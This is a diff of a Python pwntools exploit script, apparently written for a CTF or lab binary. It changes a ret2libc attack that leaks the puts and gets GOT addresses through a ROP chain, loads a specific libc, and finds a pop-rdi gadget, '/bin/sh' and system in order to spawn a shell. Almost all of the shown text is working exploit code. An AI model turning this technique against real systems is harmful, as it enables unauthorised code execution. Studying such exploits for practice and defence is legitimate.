@@ -17,11 +17,10 @@ if OFFSET == b"":
 	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
 	log.info(f"Offset is {OFFSET}")
 
-p = elf.process()
-
-print(p.recv())
+p.recv()
 
 rop1.call(elf.symbols["puts"], [elf.got['puts']])
+rop1.call(elf.symbols["puts"], [elf.got['gets']])
 rop1.call(elf.symbols["main"])
 
 payload1 = [
@@ -35,26 +34,10 @@ p.sendline(payload1)
 
 puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
 log.info(f"Puts @ {hex(puts)}")
-
-rop2 = ROP(elf)
-
-print(p.recv())
-rop2.call(elf.symbols["puts"], [elf.got['gets']])
-rop2.call(elf.symbols["main"])
-
-payload2 = [
-	b"A"*OFFSET,
-	rop2.chain()
-]
-
-payload2 = b"".join(payload2)
-p.sendline(payload2)
-
 gets = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
 log.info(f"Gets @ {hex(gets)}")
 
-#libc = ELF()
-LIBC = "./libc6_2.31-0ubuntu9.2_amd64.so"
+LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
 libc = ELF(LIBC)
 
 rop3 = ROP(libc)
@@ -70,7 +53,7 @@ payload3 = [
 payload3 = b"".join(payload3)
 
 POP_RDI = (rop3.find_gadget(['pop rdi', 'ret']))[0]
-BINSH = next(libc.search(b"/bin/sh"))  #Verify with find /bin/sh
+BINSH = next(libc.search(b"/bin/sh"))
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
 
